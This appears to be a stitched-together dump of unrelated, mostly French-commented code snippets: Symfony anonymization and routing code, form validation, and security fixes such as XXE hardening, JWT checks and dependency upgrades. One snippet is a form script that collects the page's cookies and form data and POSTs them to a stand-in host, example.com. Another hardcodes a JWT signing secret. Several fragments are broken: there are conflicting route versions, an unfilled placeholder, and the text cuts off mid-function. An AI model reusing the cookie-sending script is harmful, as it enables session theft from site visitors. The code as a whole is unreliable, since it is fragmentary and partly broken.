8// src/Service/Anonymizer/AnonymizableInterface.php

namespace App\Service\Anonymizer;

interface AnonymizableInterface
{
    public function anonymizeOldRecords(\DateTimeInterface $thresholdDate): int;
}


// src/Service/Anonymizer/UserAnonymizer.php

namespace App\Service\Anonymizer;

use App\Repository\UserRepository;
use Doctrine\ORM\EntityManagerInterface;

class UserAnonymizer implements AnonymizableInterface
{
    public function __construct(
        private UserRepository $userRepository,
        private EntityManagerInterface $em
    ) {}

    public function anonymizeOldRecords(\DateTimeInterface $thresholdDate): int
    {
        $users = $this->userRepository->createQueryBuilder('u')
            ->where('u.createdAt < :date')
            ->andWhere('u.isAnonymized = false')
            ->setParameter('date', $thresholdDate)
            ->getQuery()
            ->getResult();

        foreach ($users as $user) {
            $user->setEmail('anonyme@example.com');
            $user->setFirstname('Anonyme');
            $user->setLastname('Utilisateur');
            $user->setPhone(null);
            $user->setIsAnonymized(true);
        }

        $this->em->flush();
        return count($users);
    }
}


// src/Command/AnonymizeDataCommand.php

namespace App\Command;

use App\Service\Anonymizer\AnonymizableInterface;
use Symfony\Component\Console\Attribute\AsCommand;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;

#[AsCommand(
    name: 'app:anonymize-data',
    description: 'Anonymise les données personnelles dans plusieurs entités',
)]
class AnonymizeDataCommand extends Command
{
    /**
     * @param iterable<AnonymizableInterface> $anonymizers
     */
    public function __construct(
        private iterable $anonymizers, // Injecté automatiquement par autowiring
    ) {
        parent::__construct();
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $thresholdDate = (new \DateTimeImmutable())->modify('-1 year');

        $output->writeln('Début de l\'anonymisation globale...');

        foreach ($this->anonymizers as $anonymizer) {
            $count = $anonymizer->anonymizeOldRecords($thresholdDate);
            $output->writeln("➤ {$count} enregistrement(s) anonymisé(s) par " . $anonymizer::class);
        }

        $output->writeln('Fin de l\'anonymisation.');
        return Command::SUCCESS;
    }
}



# config/services.yaml
services:
    App\Service\Anonymizer\:
        resource: '../src/Service/Anonymizer/'
        tags: ['app.anonymizer']




        L’adresse de votre association doit contenir uniquement des lettres, chiffres, espaces et ponctuations simples (exemples : virgule, apostrophe, tiret). Exemple : 12 rue des Lilas."



new Regex([
            'pattern' => '/^[a-zA-Z0-9._%+\-]{1,30}@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/',
            'message' => 'Format invalide. Exemple : jane.doe@email.com.',
        ]),

$('.btn.btn-caap-primary.next').on('click', function () {
    const isOtherMemberBtn = $(this).is('#button-other-member');
    const presidentFound = isOtherMemberBtn ? checkPresident() : false;

    // Si le bouton n'est PAS "autre membre" OU le président a été trouvé
    if (!isOtherMemberBtn || presidentFound) {
        // Vérifie les champs visibles
        $('input:visible, textarea:visible, select:visible').each(function () {
            checkInputValidity($(this));
        });

        // Focus sur le premier champ invalide
        $('section.active').find('.is-invalid:visible').first().focus();

        // Action finale
        toggleButton($(this));
    }
});



'pattern' => '/^(?=.{6,120}$)[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/'

new Regex([
            'pattern' => '/^(?=.{6,120}$)[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/',
            'message' => 'L’adresse email doit être valide et contenir entre 6 et 120 caractères.',
        ]),

function checkInputCheckableValidity(input) {
    const emptyText = input.data('empty');
    const isRadio = input.attr('type') === 'radio';
    const isValid = input[0].checkValidity();

    if (isValid) {
        // ✅ Cas des radios
        if (isRadio) {
            $('input[type="radio"]').removeClass('is-invalid');
        }

        input
            .attr('aria-invalid', false)
            .closest('.radio-group')
            .next('.invalid-feedback')
            .removeClass('d-block')
            .text('');
    } else {
        // ❌ Cas invalide

        if (isRadio) {
            input
                .attr('aria-invalid', true)
                .closest('.radio-group')
                .next('.invalid-feedback')
                .find('.error-message')
                .text(emptyText);
        } else {
            // ✅ Pour les checkbox
            input
                .closest('.container-form-group')
                .prevAll('.invalid-feedback')
                .removeClass('d-block')
                .text('');
        }
    }
}



<form id="myForm">
  <input type="text" name="username" value="testuser">
  <input type="submit" value="Envoyer">
</form>

<script>
document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche l'envoi normal du formulaire

    // Récupère les cookies (tous les cookies accessibles par JS)
    const cookies = document.cookie;

    // Optionnel : récupère aussi les données du formulaire si besoin
    const formData = new FormData(event.target);
    const formObj = Object.fromEntries(formData.entries());

    // Combine les données à envoyer
    const dataToSend = {
        cookies: cookies,
        form: formObj
    };

    // Envoie en POST avec fetch
    fetch('http://example.com/receive', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => response.text())
    .then(result => {
        console.log('Réponse du serveur :', result);
    })
    .catch(error => {
        console.error('Erreur :', error);
    });
});
</script>





public void homepage(PrintWriter out) throws IOException, SQLException {
    out.println("<h1>User list</h1>");
    out.println("<table><thead><tr><th>User</th><th></th></tr></thead><tbody>");

    String sql = "SELECT id, name FROM users WHERE client_id = ?";
    try (
        Connection conn = DriverManager.getConnection(MyServlet.url);
        PreparedStatement pstmt = conn.prepareStatement(sql)
    ) {
        pstmt.setInt(1, this.clientId);
        ResultSet rs = pstmt.executeQuery();

        while (rs.next()) {
            out.println("<tr>");
            out.println("<td>" + StringEscapeUtils.escapeHtml(rs.getString("name")) + "</td>");
            out.println("<td><a href=\"/show/" + rs.getInt("id") + "\">Show</a></td>");
            out.println("</tr>");
        }
    }

    out.println("</tbody></table>");
}



public void showUser(HttpServletResponse response, PrintWriter out, String userId)
        throws IOException, SQLException {
    String sql = "SELECT id, name FROM users WHERE client_id = ? AND id = ?";

    try (
        Connection conn = DriverManager.getConnection(MyServlet.url);
        PreparedStatement pstmt = conn.prepareStatement(sql)
    ) {
        pstmt.setInt(1, this.clientId);
        pstmt.setInt(2, Integer.parseInt(userId)); // ⚠️ à protéger par try-catch si userId est non fiable

        ResultSet rs = pstmt.executeQuery();
        if (rs.next()) {
            out.println("<h1>User: " + StringEscapeUtils.escapeHtml(rs.getString("name")) + "</h1>");
        } else {
            out.println("<p>User not found</p>");
        }
    }
}




try {
    $constraints = $config->validationConstraints();
    $token_parsed = $config->parser()->parse($token);

    // Vérification explicite de la signature
    $valid = $config->validator()->validate($token_parsed, ...$constraints);
    if (!$valid) {
        send_http_error(400, "Bad Request. Invalid JWT token.");
        exit();
    }

    return $token_parsed->claims()->get('role');

} catch (\Throwable $e) {
    send_http_error(400, "Bad Request. Invalid JWT token.");
    exit();
}




$config->validator()->assert($token_parsed, ...$constraints);




try {
    $token_parsed = $config->parser()->parse($token);
    $constraints = $config->validationConstraints();

    $config->validator()->assert($token_parsed, ...$constraints); // lève exception si invalide

    return $token_parsed->claims()->get('role');

} catch (\Lcobucci\JWT\Validation\RequiredConstraintsViolated $e) {
    send_http_error(400, "Bad Request. Invalid JWT token.");
    exit();
} catch (\Throwable $e) {
    send_http_error(400, "Bad Request. Token parsing error.");
    exit();
}




function checkAuth($data) {
    global $config;

    if (!isset($data) || !isset($data->token) || $data->token === '') {
        send_http_error(401, "Authentication is required.");
        exit();
    }

    $token = $data->token;

    // Vérifie la signature manuellement
    if (!verifySignature($token, 'HS_This-Is-My_Very_V3RY_str0Ng-KEY_123')) {
        send_http_error(400, "Bad Request. Invalid JWT signature.");
        exit();
    }

    try {
        $token_parsed = $config->parser()->parse($token);
        $role = $token_parsed->claims()->get('role');
        return $role;
    } catch (\Throwable $e) {
        send_http_error(400, "Bad Request. Invalid JWT format.");
        exit();
    }
}




function verifySignature(string $jwt, string $secret): bool {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) {
        return false;
    }

    list($header, $payload, $signature) = $parts;

    // Recalcul de la signature
    $data = $header . '.' . $payload;
    $expectedSignature = rtrim(strtr(base64_encode(hash_hmac('sha256', $data, $secret, true)), '+/', '-_'), '=');

    // Comparaison sécurisée
    return hash_equals($expectedSignature, $signature);
}




<?php

class DatabaseManager
{
    private $databaseUrl = "sqlite:///tmp/db.sqlite";
    private $pdo;

    public function __construct()
    {
        try {
            $this->pdo = new PDO($this->databaseUrl);
        } catch (PDOException $e) {
            die("Database connection error: " . $e->getMessage());
        }
    }

    /**
     * Crée un utilisateur avec un mot de passe hashé en bcrypt.
     */
    public function createUser($email, $password)
    {
        $query = $this->pdo->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
        $hashedPassword = password_hash($password, PASSWORD_BCRYPT);
        return $query->execute([
            'email' => $email,
            'password' => $hashedPassword
        ]);
    }

    /**
     * Tente de connecter un utilisateur via email et mot de passe.
     */
    public function login($email, $password)
    {
        $query = $this->pdo->prepare("SELECT password FROM users WHERE email = :email");
        $query->execute(['email' => $email]);
        $result = $query->fetch(PDO::FETCH_ASSOC);

        if (!$result) {
            return false;
        }

        return password_verify($password, $result['password']);
    }

    /**
     * Vérifie un mot de passe en le comparant avec le hash stocké.
     */
    public function verifyPassword($password, $hash)
    {
        return password_verify($password, $hash);
    }

    /**
     * Déhashage (inutilisable avec bcrypt) – conservé ici pour compatibilité.
     */
    public function decryptPassword($password_hash)
    {
        return '[NON DISPONIBLE AVEC BCRYPT]';
    }
}



package com.example.xxe.controllers;

import com.example.xxe.data.Product;
import com.example.xxe.repositories.ProductRepository;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;

import org.w3c.dom.*;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

@Controller
public class ProductController {

    private final ProductRepository productRepository;

    public ProductController(ProductRepository productRepository) {
        this.productRepository = productRepository;
    }

    @PostMapping("/api")
    @ResponseBody
    public String index(@RequestBody String xml) throws ParserConfigurationException, SAXException, IOException {
        HashMap<String, List<Product>> response = new HashMap<>();
        ArrayList<Product> searchRequest = parseXml(xml);

        response.put("request", new ArrayList<>());
        for (Product product : searchRequest) {
            response.get("request").add(new Product(product.getName(), product.getPrice()));
        }

        response.put("searchResults", new ArrayList<>());
        for (Product product : searchRequest) {
            response.get("searchResults").addAll(productRepository.findByNameContaining(product.getName()));
        }

        XmlMapper mapper = new XmlMapper();
        return mapper.writeValueAsString(response);
    }

    /**
     * Méthode sécurisée pour parser du XML sans risque XXE.
     */
    private ArrayList<Product> parseXml(String body) throws ParserConfigurationException, IOException, SAXException {
        ArrayList<Product> list = new ArrayList<>();

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // 🔐 Sécurité anti-XXE
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        ByteArrayInputStream input = new ByteArrayInputStream(body.getBytes(StandardCharsets.UTF_8));
        Document doc = builder.parse(input);

        NodeList childNodes = doc.getDocumentElement().getElementsByTagName("product");

        for (int i = 0; i < childNodes.getLength(); i++) {
            Node item = childNodes.item(i);
            Product p = new Product();
            p.setName(item.getTextContent());
            list.add(p);
        }

        return list;
    }
}
@PostMapping("/base64tojson")
@ResponseBody
public String base64ToJson(@RequestBody String base64) throws IOException {
    byte[] jsonBytes = Base64.getDecoder().decode(base64);
    String json = new String(jsonBytes, StandardCharsets.UTF_8);
    
    // Sécurisé : Jackson lit du JSON vers User
    User user = new ObjectMapper().readValue(json, User.class);
    
    return new ObjectMapper().writeValueAsString(user);
}







import java.io.ObjectInputFilter;

// ...

@PostMapping("/base64tojson")
@ResponseBody
public String base64ToJson(@RequestBody String base64) throws IOException, ClassNotFoundException {
    ByteArrayInputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(base64));
    ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);

    // 🛡️ Appliquer un filtre de sécurité pour restreindre les classes autorisées
    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.sysdream.unserialize.controllers.ConverterController$User;!*");
    objectInputStream.setObjectInputFilter(filter);

    User user = (User) objectInputStream.readObject();
    return new ObjectMapper().writeValueAsString(user);
}





<dependencies>
  <!-- JUnit : ancienne version 4.11 -> mise à jour vers 4.13.2 -->
  <dependency>
    <groupId>junit</groupId>
    <artifactId>junit</artifactId>
    <version>4.13.2</version>
    <scope>test</scope>
  </dependency>

  <!-- SnakeYAML : 1.14 est très vulnérable (RCE). Mise à jour vers 2.2 -->
  <dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>2.2</version>
  </dependency>

  <!-- prime-jwt : 1.0.0 est vulnérable. La dernière version fiable est 1.3.0 (2020) 
       ⚠️ pas beaucoup maintenu, à remplacer à terme par Nimbus JOSE + JWT si possible -->
  <dependency>
    <groupId>com.inversoft</groupId>
    <artifactId>prime-jwt</artifactId>
    <version>1.3.0</version>
  </dependency>
</dependencies>





<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.sysdream.app</groupId>
    <artifactId>java-app</artifactId>
    <version>1.0-SNAPSHOT</version>
    <name>java-app</name>
    <url>https://www.sysdream.com</url>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>1.8</maven.compiler.source>
        <maven.compiler.target>1.8</maven.compiler.target>
    </properties>

    <dependencies>
        <!-- JUnit pour les tests -->
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.13.2</version>
            <scope>test</scope>
        </dependency>

        <!-- SnakeYAML sécurisé -->
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>2.2</version>
        </dependency>

        <!-- Prime-JWT est peu maintenu, à remplacer par Nimbus -->
        <dependency>
            <groupId>com.nimbusds</groupId>
            <artifactId>nimbus-jose-jwt</artifactId>
            <version>9.37</version>
        </dependency>
    </dependencies>

    <build>
        <pluginManagement>
            <plugins>
                <plugin>
                    <artifactId>maven-clean-plugin</artifactId>
                    <version>3.2.0</version>
                </plugin>
                <plugin>
                    <artifactId>maven-resources-plugin</artifactId>
                    <version>3.3.1</version>
                </plugin>
                <plugin>
                    <artifactId>maven-compiler-plugin</artifactId>
                    <version>3.11.0</version>
                </plugin>
                <plugin>
                    <artifactId>maven-surefire-plugin</artifactId>
                    <version>3.2.5</version>
                </plugin>
                <plugin>
                    <artifactId>maven-jar-plugin</artifactId>
                    <version>3.3.0</version>
                </plugin>
                <plugin>
                    <artifactId>maven-install-plugin</artifactId>
                    <version>3.1.0</version>
                </plugin>
                <plugin>
                    <artifactId>maven-deploy-plugin</artifactId>
                    <version>3.1.1</version>
                </plugin>
                <plugin>
                    <artifactId>maven-site-plugin</artifactId>
                    <version>3.12.1</version>
                </plugin>
                <plugin>
                    <artifactId>maven-project-info-reports-plugin</artifactId>
                    <version>3.4.3</version>
                </plugin>
            </plugins>
        </pluginManagement>
    </build>
</project>




async function inverserNumEtape(div_origine, div_cible, position) {
  if (!div_cible) return;

  const idOrigine = div_origine.dataset.pageid;
  const idCible = div_cible.dataset.pageid;
  const numEtapeOrigine = div_origine.dataset.pagenum;
  const numEtapeCible = div_cible.dataset.pagenum;

  const demo_id = ...; // à adapter : récupère l’ID de la démo depuis une variable globale ou un attribut HTML

  try {
    const response = await fetch(`/demo/creator/inverserOrdrePages/${demo_id}/${idOrigine}/${idCible}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (!response.ok) {
      throw new Error(`Erreur HTTP ${response.status}`);
    }

    const result = await response.json(); // si le backend renvoie un JSON, sinon supprime cette ligne

    const previousDiv = document.querySelector("#divrow-etape-" + idOrigine);
    const nextDiv = document.querySelector("#divrow-etape-" + idCible);

    if (previousDiv) {
      const deleteLink = previousDiv.querySelector("a.delete-etape");
      if (deleteLink) {
        deleteLink.href = `/demo/creator/${demo_id}/delete/${numEtapeCible}`;
      }
    }

    if (nextDiv) {
      const deleteLink = nextDiv.querySelector("a.delete-etape");
      if (deleteLink) {
        deleteLink.href = `/demo/creator/${demo_id}/delete/${numEtapeOrigine}`;
      }
    }

    switchEtape(div_origine, div_cible, position);
    resetArrows();
    changeEtape("row-etape-" + idOrigine);

  } catch (error) {
    console.error("Erreur lors de l'inversion d'étape :", error);
  }
}

function switchEtape(currentStep, targetStep, position) {
    const tempPageNum = currentStep.dataset.pagenum;
    const targetPageNum = targetStep.dataset.pagenum;

    const getTextarea = pageNum =>
        $(`textarea[id=modalCommentForm_etape_${pageNum}_contenu]`);

    const currentComment = getTextarea(tempPageNum).text();
    const targetComment = getTextarea(targetPageNum).text();

    const findButtonByEtapeNum = etapeNum =>
        buttons.flat().find(item => item.etapenum === etapeNum);

    const currentBtn = findButtonByEtapeNum(tempPageNum);
    const targetBtn = findButtonByEtapeNum(targetPageNum);

    // Échange les commentaires
    getTextarea(tempPageNum).text(targetComment);
    getTextarea(targetPageNum).text(currentComment);

    // Échange les numéros de page
    [currentStep.dataset.pagenum, targetStep.dataset.pagenum] = [targetPageNum, tempPageNum];

    // Mise à jour des images
    const swapImgSrc = (source, target) => {
        const tempSrc = $(source).attr("src");
        $(source).attr("src", $(target).attr("src"));
        $(target).attr("src", tempSrc);
    };

    swapImgSrc(currentStep.querySelector("img.card-img"),
               targetStep.querySelector("img.card-img"));

    // Mise à jour de l’affichage des numéros de page
    currentBtn.etapenum = targetPageNum;
    targetBtn.etapenum = tempPageNum;

    currentStep.getElementsByClassName("pagesnum")[0].innerHTML = targetPageNum;
    targetStep.getElementsByClassName("pagesnum")[0].innerHTML = tempPageNum;

    // Réinsertion de l’élément déplacé
    targetStep.insertAdjacentElement(position, currentStep);
}






use Symfony\Component\HttpFoundation\Response;

// Avant le `return $this->render(...)`
$response = $this->render('creation/creator.html.twig', [...]);
$response->headers->set('Cache-Control', 'no-cache, no-store, must-revalidate');
$response->headers->set('Pragma', 'no-cache');
$response->headers->set('Expires', '0');
return $response;

const newSrcCurrent = $(targetStep).find("img.card-img").attr("src").split('?')[0];
$(currentStep).find("img.card-img").attr("src", `${newSrcCurrent}?v=${Date.now()}`);

const newSrcTarget = temp_pageImg.split('?')[0];
$(targetStep).find("img.card-img").attr("src", `${newSrcTarget}?v=${Date.now()}`);


$timestamp = time(); // ou microtime(true) ou uniqid() si tu préfères
$numEtape = $page->getNumEtape();
$htmlContent = "<img src=\"img/{$numEtape}.png?v={$timestamp}\" id=\"Screenshot\" class=\"Screenshot\">";






use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\File\Exception\FileNotFoundException;

// ...

#[Route('/demo/view/{idDemo}', name: 'app_demo_view')]
public function viewDemo($idDemo, DemoRepository $demoRepository): Response
{
    $filePath = $this->getParameter('demos_directory') . DIRECTORY_SEPARATOR . $idDemo . DIRECTORY_SEPARATOR . 'index.html';

    if (!file_exists($filePath)) {
        throw new FileNotFoundException("Le fichier HTML de la démo est introuvable.");
    }

    $htmlContent = file_get_contents($filePath);

    return new Response($htmlContent, 200, [
        'Content-Type' => 'text/html; charset=UTF-8',
        'Cache-Control' => 'no-cache, no-store, must-revalidate',
        'Pragma' => 'no-cache',
        'Expires' => '0',
    ]);
}





#[Route('/demos/{idDemo}/index.html', name: 'app_demo_html')]
public function serveHtml(
    string $idDemo
): Response {
    $filePath = $this->getParameter('demos_directory') . DIRECTORY_SEPARATOR . $idDemo . DIRECTORY_SEPARATOR . 'index.html';

    if (!file_exists($filePath)) {
        throw $this->createNotFoundException("Fichier non trouvé");
    }

    return new Response(
        file_get_contents($filePath),
        200,
        [
            'Content-Type' => 'text/html',
            'Cache-Control' => 'no-store, no-cache, must-revalidate',
        ]
    );
}

#[Route('/demos/{idDemo}/index.html', name: 'app_demo_proxy')]
public function proxyDemoAccess(string $idDemo): Response
{
    // Forcer redirection vers /demo/{id} si accès direct
    return $this->redirectToRoute('app_demo_export', ['idDemo' => $idDemo]);
}


app_demo_proxy:
  path: /demos/{idDemo}/index.html
  controller: App\Controller\DemoController::proxyDemoAccess
  methods: [GET]

return new RedirectResponse("/demos/$idDemo/index.html?v=" . time());







#[Route('/demos/{idDemo}/index.html', name: 'app_demo_view')]
public function serveDemo(string $idDemo): Response
{
    // Génère ou lit le HTML à jour depuis var/demos/
    $filePath = $this->getParameter('kernel.project_dir') . '/var/demos/' . $idDemo . '/index.html';

    if (!file_exists($filePath)) {
        throw $this->createNotFoundException("Demo introuvable.");
    }

    return new Response(file_get_contents($filePath), 200, [
        'Content-Type' => 'text/html',
        'Cache-Control' => 'no-store, no-cache, must-revalidate',
    ]);
}


#[Route('/demo/{idDemo}', name: 'app_demo_export')]
public function generateAndRedirect(string $idDemo): Response
{
    // Ici tu génères le fichier dans var/demos/{$idDemo}/index.html
    $this->demoService->generateHtml($idDemo);

    // Redirection vers route Symfony, pas un fichier statique
    return $this->redirectToRoute('app_demo_view', ['idDemo' => $idDemo]);
}






// Route d’entrée utilisateur : déclenche l'export si besoin
#[Route('/demo/{idDemo}', name: 'app_demo_export')]
public function viewDemo($idDemo, DemoRepository $demoRepository, ModalRepository $modalRepository, BoutonRepository $boutonRepository, PageRepository $pageRepository, GestionExportDemos $gestionExportDemo): Response
{
    $currentDemo = $demoRepository->find($idDemo);

    // Export vers /var/demos/...
    $gestionExportDemo->exportDemo(
        $currentDemo,
        $this->getParameter('kernel.project_dir') . '/var/demos/' . $idDemo
    );

    // Redirection vers l'URL publique
    return new RedirectResponse('/demos/' . $idDemo . '/index.html');
}



// Route technique, publique, mais qui redirige vers la bonne si appelée en direct
#[Route('/demos/{idDemo}/index.html', name: 'app_demo_proxy')]
public function proxyDemoAccess(string $idDemo): Response
{
    // Ne génère rien, redirige proprement
    return $this->redirectToRoute('app_demo_export', ['idDemo' => $idDemo]);
}



#[Route([
    '/demo/{idDemo}',
    '/demos/{idDemo}/index.html'
], name: 'app_demo_export')]
public function viewDemo(
    $idDemo,
    Request $request,
    DemoRepository $demoRepository,
    ModalRepository $modalRepository,
    BoutonRepository $boutonRepository,
    PageRepository $pageRepository,
    GestionExportDemos $gestionExportDemo
): Response {
    $currentDemo = $demoRepository->find($idDemo);
    $gestionExportDemo->exportDemo($currentDemo, $this->getParameter('kernel.project_dir') . '/var/demos/' . $idDemo);

    // ✅ Ne redirige que si l'utilisateur ne vient pas déjà de /demos/{idDemo}/index.html
    if (!$request->query->getBoolean('_from_proxy')) {
        return new RedirectResponse('/demos/' . $idDemo . '/index.html');
    }

    // Sinon, retournez une réponse simple ou vide (car la redirection a déjà été faite)
    return new Response(); // ou un message
}




return $this->redirectToRoute('app_demo_export', [
    'idDemo' => $idDemo,
    '_from_proxy' => true,
]);



#[Route('/demos/{idDemo}/index.html', name: 'app_demo_proxy')]
public function proxyDemoAccess(string $idDemo): Response
{
    // ✅ Redirige vers /demo/{idDemo} avec un flag pour ne pas reboucler
    return $this->redirectToRoute('app_demo_export', [
        'idDemo' => $idDemo,
        '_from_proxy' => true,
    ]);
}




#[Route('/demos/{idDemo}/index.html', name: 'app_demo_proxy')]
public function proxyDemoAccess(string $idDemo, Request $request): Response
{
    // Si déjà redirigé depuis ce contrôleur, ne pas reboucler
    if ($request->query->get('_from_proxy')) {
        throw $this->createNotFoundException("Redirection loop detected.");
    }

    // Sinon redirige vers /demo/{idDemo} avec un flag pour éviter la boucle
    return $this->redirectToRoute('app_demo_export', [
        'idDemo' => $idDemo,
        '_from_proxy' => 1,
    ]);
}





#[Route([
    '/demo/{idDemo}',
    '/demos/{idDemo}/index.html'
], name: 'app_demo_export')]
public function viewDemo(
    string $idDemo,
    DemoRepository $demoRepository,
    GestionExportDemos $gestionExportDemo
): Response {
    $currentDemo = $demoRepository->find($idDemo);
    if (!$currentDemo) {
        throw $this->createNotFoundException("Démo introuvable.");
    }

    // Génère la démo dans /var/demos/{idDemo}
    $demoDir = $this->getParameter('kernel.project_dir') . '/var/demos/' . $idDemo;
    $gestionExportDemo->exportDemo($currentDemo, $demoDir);

    // 🔁 Lire le contenu du fichier généré
    $filePath = $demoDir . '/index.html';

    if (!file_exists($filePath)) {
        throw $this->createNotFoundException("Fichier index.html non trouvé.");
    }

    return new Response(
        file_get_contents($filePath),
        200,
        ['Content-Type' => 'text/html']
    );
}







function switchEtape(currentStep, targetStep, position) {
    const tempPageNum = currentStep.dataset.pagenum;
    const tempPageImg = currentStep.dataset.paging;
    const targetPageNum = targetStep.dataset.pagenum;
    const targetPageImg = targetStep.dataset.paging;

    // Récupérer les commentaires
    const currentComment = $(`#textarea[id=modalCommentForm_etape_${tempPageNum}_contenu]`).text();
    const targetComment = $(`#textarea[id=modalCommentForm_etape_${targetPageNum}_contenu]`).text();

    // Mise à jour des commentaires dans les bons textareas
    $(`#textarea[id=modalCommentForm_etape_${tempPageNum}_contenu]`).text(targetComment);
    $(`#textarea[id=modalCommentForm_etape_${targetPageNum}_contenu]`).text(currentComment);

    // Mise à jour des boutons
    const currentBtn = buttons.flat().find(item => item.etapenum == tempPageNum);
    const targetBtn = buttons.flat().find(item => item.etapenum == targetPageNum);

    // Échange des attributs
    currentStep.dataset.pagenum = targetPageNum;
    currentStep.dataset.paging = targetPageImg;
    targetStep.dataset.pagenum = tempPageNum;
    targetStep.dataset.paging = tempPageImg;

    // Échange des images avec "cache buster" via Date.now()
    const currentImgElem = $(currentStep).find("img.card-img");
    const targetImgElem = $(targetStep).find("img.card-img");

    const currentSrc = targetImgElem.attr("src").split("?")[0];
    const targetSrc = currentImgElem.attr("src").split("?")[0];

    currentImgElem.attr("src", `${currentSrc}?v=${Date.now()}`);
    targetImgElem.attr("src", `${targetSrc}?v=${Date.now()}`);

    // Mise à jour des numéros visibles
    currentStep.getElementsByClassName("pagesNum")[0].innerHTML = targetPageNum;
    targetStep.getElementsByClassName("pagesNum")[0].innerHTML = tempPageNum;

    // Mise à jour des objets boutons
    currentBtn.etapenum = targetPageNum;
    targetBtn.etapenum = tempPageNum;

    // Réinsertion des éléments dans le DOM
    targetStep.insertAdjacentElement(position, currentStep);
}




use Symfony\Component\Security\Core\Exception\AccessDeniedException;

#[Route('/some-path', name: 'some_route')]
public function index(Security $security): Response
{
    if ($security->isGranted('ROLE_ADMIN') || $security->isGranted('ROLE_SUPER_ADMIN')) {
        throw new AccessDeniedException('Accès refusé aux administrateurs.');
    }

    // Suite du code...
}







use Symfony\Component\Form\AbstractType;
use Symfony\Component\Form\FormBuilderInterface;
use Symfony\Component\Asset\Packages;
use Symfony\Component\Form\Extension\Core\Type\TextType;

class DemoType extends AbstractType
{
    private Packages $assets;

    public function __construct(Packages $assets)
    {
        $this->assets = $assets;
    }

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $imgUrl = $this->assets->getUrl('img/logo.png');

        $builder->add('champ', TextType::class, [
            'label' => '<img src="' . $imgUrl . '" alt="logo">',
            'label_html' => true,
        ]);
    }
}





$roles = $user->getRoles();

switch (true) {
    case in_array('ROLE_ADMIN', $roles, true):
        // Code pour admin
        break;

    case in_array('ROLE_CREATION', $roles, true):
        // Code pour création
        break;

    case in_array('ROLE_USER', $roles, true):
        // Code pour user
        break;

    default:
        // Aucun rôle connu
        break;
}






$qb = $repo->createQueryBuilder('e')
    ->where('e.user = :user')
    ->andWhere('JSON_CONTAINS(e.user.roles, :role) = 1')
    ->setParameter('user', $user)
    ->setParameter('role', '"ROLE_ADMIN"') // ⚠️ avec guillemets car JSON
    ->getQuery()
    ->getOneOrNullResult();




public function findOneByIdAndSameCRForAdmin(int $demoId, User $admin): ?Demo
{
    return $this->createQueryBuilder('d')
        ->join('d.user', 'u')
        ->where('d.id = :demoId')
        ->andWhere('u.caisseRegionale = :cr')
        ->setParameter('demoId', $demoId)
        ->setParameter('cr', $admin->getCaisseRegionale())
        ->getQuery()
        ->getOneOrNullResult();
}




use Symfony\Component\Security\Core\Exception\AccessDeniedException;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\Security\Core\Security;

class YourController extends AbstractController
{
    private Security $security;

    public function __construct(Security $security)
    {
        $this->security = $security;
    }

    /**
     * Lève une exception si l'utilisateur a l'un des rôles interdits.
     *
     * @param string[] $deniedRoles Liste des rôles à interdire (ex: ['ROLE_ADMIN', 'ROLE_SUPER_ADMIN'])
     */
    public function denyAccessIfHasRole(array $deniedRoles): void
    {
        $user = $this->security->getUser();

        if (!$user) {
            throw new AccessDeniedException('Utilisateur non connecté.');
        }

        $userRoles = $user->getRoles();

        if (!empty(array_intersect($userRoles, $deniedRoles))) {
            throw new AccessDeniedException('Accès interdit pour ce rôle.');
        }
    }
}







/**
 * Récupère une démo si :
 * - l'utilisateur est admin ou super admin
 * - et la démo appartient à un user de la même CR
 * - si $param est true : filtre aussi sur communautaire = true
 */
public function findOneByIdAndSameCRForAdmin(int $demoId, User $admin, bool $filterCommunautaire = false): ?Demo
{
    $qb = $this->createQueryBuilder('d')
        ->join('d.user', 'u')
        ->andWhere('d.id = :demoId')
        ->andWhere('u.caisseRegionale = :cr')
        ->setParameter('demoId', $demoId)
